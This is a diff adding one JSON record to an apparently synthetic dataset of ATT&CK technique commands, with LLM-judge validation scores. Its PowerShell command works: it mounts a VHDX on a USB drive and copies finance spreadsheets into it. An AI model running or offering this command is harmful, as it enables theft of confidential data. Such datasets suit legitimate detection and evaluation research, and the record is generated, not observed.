@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $vhd=Join-Path $usb 'stash.vhdx'; Mount-DiskImage -ImagePath $vhd -PassThru | Out-Null; $dl=((Get-DiskImage -ImagePath $vhd | Get-Disk | Get-Partition | Get-Volume)[0].DriveLetter); New-Item -ItemType Directory -Path \"$($dl):\\Rpts\" -Force | Out-Null; Copy-Item -Path 'C:\\Finance\\Q*\\*.xlsx' -Destination \"$($dl):\\Rpts\" -Recurse -Force; Dismount-DiskImage -ImagePath $vhd",
+  "explanation": "Mounts a VHDX stored on the USB, copies financial spreadsheets into it, then cleanly dismounts.",
+  "rationale_steps": [
+    "Locate removable drive and VHDX container",
+    "Mount VHDX using Mount-DiskImage",
+    "Copy selected data into mounted image",
+    "Dismount image to persist data on removable media"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-3ef24ae6",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting/parentheses, valid cmdlets/parameters, and correct use of pipelines, indexing, and separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements exfiltration to a physical medium by mounting a USB-hosted VHDX, copying targeted files, and dismounting, but mounting VHDs typically requires administrative privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:31:23.966851Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, balanced parentheses/braces, correct pipeline operations, and appropriate semicolons separating distinct operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the T1052 technique by identifying a removable drive, mounting a VHDX container on it, copying financial spreadsheets into the container, and then cleanly dismounting it - creating a perfect example of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:31:27.057043Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes/parentheses, correct command separators, and valid flag formats throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "The command's operational steps are aligned with the exfiltration technique, but it fails operational plausibility as `Mount-DiskImage` and `Dismount-DiskImage` require Administrator privileges, directly contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:31:45.375028Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
